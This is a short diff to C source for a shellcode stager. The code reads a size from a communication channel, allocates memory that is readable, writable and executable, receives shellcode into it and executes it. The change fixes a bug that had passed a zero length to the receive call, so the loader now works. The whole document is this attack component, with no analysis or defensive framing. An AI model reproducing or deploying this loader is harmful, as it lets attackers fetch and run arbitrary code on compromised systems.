@@ -5,10 +5,10 @@
 
 typedef __attribute__((noreturn)) void (* shellcode)(void);
 
-SHELLCODE_ENTRY {
-
+SHELLCODE_ENTRY
+{
     Channel channel;
-    unsigned short buffer_size = 0, count = 0;
+    unsigned short buffer_size = 0;
     unsigned char *memory;
 
     /* Read the size of the input buffer (2 bytes). */
@@ -16,9 +16,8 @@ SHELLCODE_ENTRY {
     memory = (unsigned char *) allocate_memory(buffer_size, PROT_READ|PROT_WRITE|PROT_EXEC);
 
     /* Read shellcode in memory. */
-    channel.recv(memory, count);
+    channel.recv(memory, buffer_size);
 
     /* Execute shellcode. */
     ((shellcode) memory)();
-
-} SHELLCODE_END
+}
